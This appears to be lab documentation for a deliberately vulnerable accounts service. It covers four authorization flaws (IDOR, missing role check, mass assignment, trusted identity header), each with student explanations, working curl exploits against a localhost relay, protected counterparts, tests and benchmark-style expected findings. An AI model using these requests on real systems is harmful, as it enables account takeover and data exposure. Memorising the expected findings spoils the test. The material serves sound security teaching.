# `ACCESS` — authorization

Four weaknesses of the old clients' paths in `accounts`: an object read with no owner check, a role write with no role check, a profile route that takes the body as the change, and an internal route that believes a header. Reproductions run against the accounts relay, `RELAY` (`http://127.0.0.1:4111` on the builder's port set; `3201` on the defaults).

## ACCESS-001 — another account by identifier, with no ownership check

### ACCESS-001 — agent reference

| | |
| --- | --- |
| Operation | GraphQL `userPreferences(userId: ID!)` |
| Sink | The named account answered to any caller, in `apps/accounts/src/legacy/users-preferences.resolver.ts` |
| Flow | a user's token → any `userId` → that account's email and preferences |
| Counterparts | `apps/accounts/src/auth/auth.resolver.ts` (`me`: the caller's own record, no argument to name another), `apps/accounts/src/users/users.resolver.ts` (`user(id)`: an administrator's operation) |
| Tests | `apps/accounts/test/scenarios/crypto-access.int-spec.ts` |
| Expected finding | Yes, CWE-639, SAST |

### ACCESS-001 — student guide

An identifier in the request is a claim about *what* to read, never *who* is reading. The legacy lookup never ties the two together, so Alice's token reads Bob's record by naming Bob.

### ACCESS-001 — exploit lab

```console
$ curl -s $RELAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $ALICE" \
    --data-raw '{"query":"query ($u: ID!) { userPreferences(userId: $u) }","variables":{"u":"u-bob"}}'
{"data":{"userPreferences":{"email":"bob@vcx.exchange","preferences":{"theme":"dark","language":"en","currency":"USD","marketingEmails":"false"}}}}
```

Bob's email and preferences, on Alice's token. `me` answers the caller's own record and has no argument that could name Bob; `user(id: "u-bob")` on Alice's token is `FORBIDDEN` — the roles guard stops a user's token before the resolver runs.

### ACCESS-001 — vulnerable and protected

| | Why |
| --- | --- |
| `userPreferences(userId)` (vulnerable) | The identifier decides what is read; nothing checks whose it is |
| `me` (protected) | The record is the caller's own; there is no way to ask for another account |
| `user(id)` (protected) | An administrator's operation; a user's token is refused at the guard |

### ACCESS-001 — tests

`apps/accounts/test/scenarios/crypto-access.int-spec.ts`, `ACCESS-001`: Alice's token reads Bob's email and preferences; `me` answers only Alice; `user(id)` refuses Alice's token.

## ACCESS-003 — a user's token opens an administrator's account

### ACCESS-003 — agent reference

| | |
| --- | --- |
| Operation | GraphQL `createUserAccount(input: CreateUserInput!)` |
| Sink | No role check before creating an account with the input's `role`, in `apps/accounts/src/legacy/account-creation.resolver.ts` |
| Flow | a user's token → the input says `role: ADMIN` → an administrator's account exists |
| Counterparts | `apps/accounts/src/users/users.resolver.ts` (`createUser` under `@Roles('ADMIN')`), `apps/accounts/src/admin/admin.controller.ts` (`POST /internal/admin/users`: roles guard and DTO) |
| Tests | `apps/accounts/test/scenarios/crypto-access.int-spec.ts` |
| Expected finding | Yes, CWE-862, SAST |

### ACCESS-003 — student guide

Authentication is not authorization: the mutation checks that a token is present, never what the token's role is. The input carries the role of the account to create, and it is written.

### ACCESS-003 — exploit lab

```console
$ curl -s $RELAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $BOB" \
    --data-raw '{"query":"mutation ($i: CreateUserInput!) { createUserAccount(input: $i) { id email role } }","variables":{"i":{"email":"zazzles-lab-marker@vcx.exchange","displayName":"Marker Account","password":"marker-lab-only","role":"ADMIN"}}}'
{"data":{"createUserAccount":{"id":"u-c231d48b…","email":"zazzles-lab-marker@vcx.exchange","role":"ADMIN"}}}
```

The same input on Bob's token to `createUser`: `FORBIDDEN`. To `POST /internal/admin/users`: 403, the roles guard answers before the DTO is seen.

### ACCESS-003 — vulnerable and protected

| | Why |
| --- | --- |
| `createUserAccount(input)` (vulnerable) | Any token is enough, and the input's `role` is written as given |
| `createUser` (protected) | `@Roles('ADMIN')`; a user's token is refused for this input |
| `POST /internal/admin/users` (protected) | The roles guard first, then a validated DTO |

### ACCESS-003 — tests

`apps/accounts/test/scenarios/crypto-access.int-spec.ts`, `ACCESS-003`: the marker account is created `ADMIN` on Bob's token and the counts say so; both counterparts refuse the same input.

## ACCESS-004 — the body of the legacy profile editor is the change

### ACCESS-004 — agent reference

| | |
| --- | --- |
| Operation | REST `PATCH /internal/profile` |
| Sink | The request body assigned onto the record property by property, in `apps/accounts/src/legacy/legacy-profile.controller.ts` |
| Flow | `{"displayName":…,"role":"ADMIN"}` → every property written → the caller's own role changes |
| Counterparts | `apps/accounts/src/profile/profile.resolver.ts` (`updateProfile`: a typed input), `apps/accounts/src/profile/profile.controller.ts` (`PUT /internal/profile`: the whitelist is on, fields copied by name) |
| Tests | `apps/accounts/test/scenarios/crypto-access.int-spec.ts` |
| Expected finding | Yes, CWE-915, SAST |

### ACCESS-004 — student guide

The old editor sent "the fields that changed", and the server wrote the change it was handed. A property the caller was never meant to set travels the same road as a display name, because nothing names the fields this route may write.

### ACCESS-004 — exploit lab

```console
$ curl -s -X PATCH $RELAY/internal/profile -H 'content-type: application/json' -H "authorization: Bearer $ALICE" \
    -d '{"displayName":"Alice Patched","role":"ADMIN"}' | jq '{id, role}'
{"id":"u-alice","role":"ADMIN"}
```

Alice's own record says she is an administrator, and the answer said so. The same body to `PUT /internal/profile`: 400 — the DTO declares two fields and a third is an error. To `updateProfile`: `BAD_USER_INPUT` — `role` is not a field of the input, so it is refused, not written.

### ACCESS-004 — vulnerable and protected

| | Why |
| --- | --- |
| `PATCH /internal/profile` (vulnerable) | The body is the change document: every property it carries is written |
| `updateProfile` (protected) | A typed input; an unknown property is refused for this payload |
| `PUT /internal/profile` (protected) | The global whitelist is on and the fields are copied by name |

### ACCESS-004 — tests

`apps/accounts/test/scenarios/crypto-access.int-spec.ts`, `ACCESS-004`: the PATCH writes `role: ADMIN` and the store agrees (then the lab reset restores Alice); both counterparts refuse the same body.

## ACCESS-005 — a header believed as identity

### ACCESS-005 — agent reference

| | |
| --- | --- |
| Operation | REST `GET /internal/me` |
| Sink | `x-user-id` read and trusted as the caller, in `apps/accounts/src/legacy/legacy-me.controller.ts` |
| Flow | a local caller sets the header → the route answers the account it names, with no token at all |
| Counterparts | `apps/accounts/src/auth/auth.controller.ts` (`introspect`: the token must verify), `apps/accounts/src/users/users.controller.ts` (`GET /internal/users/lookup`: the service token decides) |
| Tests | `apps/accounts/test/scenarios/crypto-access.int-spec.ts` |
| Expected finding | Yes, CWE-807, SAST |

### ACCESS-005 — student guide

The old gateway put the caller's id in a header after its own check, and the route behind it believed the header forever after. A header a client can set is not a credential: on the loopback the lab lives on, any process can claim any account.

### ACCESS-005 — exploit lab

```console
$ curl -s $RELAY/internal/me -H 'x-user-id: u-admin' | jq '{id, email, role}'
{"id":"u-admin","email":"admin@vcx.exchange","role":"ADMIN"}
```

The administrator's whole profile, with no credentials at all. The same header against the counterparts:

```console
$ curl -s -o /dev/null -w '%{http_code}\n' $RELAY/internal/sessions/introspect \
    -H 'content-type: application/json' -H 'x-user-id: u-admin' -d '{"token":"not-a-token"}'
401
$ curl -s -o /dev/null -w '%{http_code}\n' "$RELAY/internal/users/lookup?email=admin@vcx.exchange" \
    -H 'x-user-id: u-admin'
401
```

`introspect` is closed: a token must verify first. The lookup answers the run's service token, and no header stands in for it.

### ACCESS-005 — vulnerable and protected

| | Why |
| --- | --- |
| `GET /internal/me` (vulnerable) | The header is the whole proof of identity |
| `introspect` (protected) | A closed operation; the token is verified, and this request carries none that does |
| `GET /internal/users/lookup` (protected) | Only the run's service token opens it; `x-user-id` is not a credential |

### ACCESS-005 — tests

`apps/accounts/test/scenarios/crypto-access.int-spec.ts`, `ACCESS-005`: the header alone answers the administrator's profile; both counterparts answer 401 to the same headers.
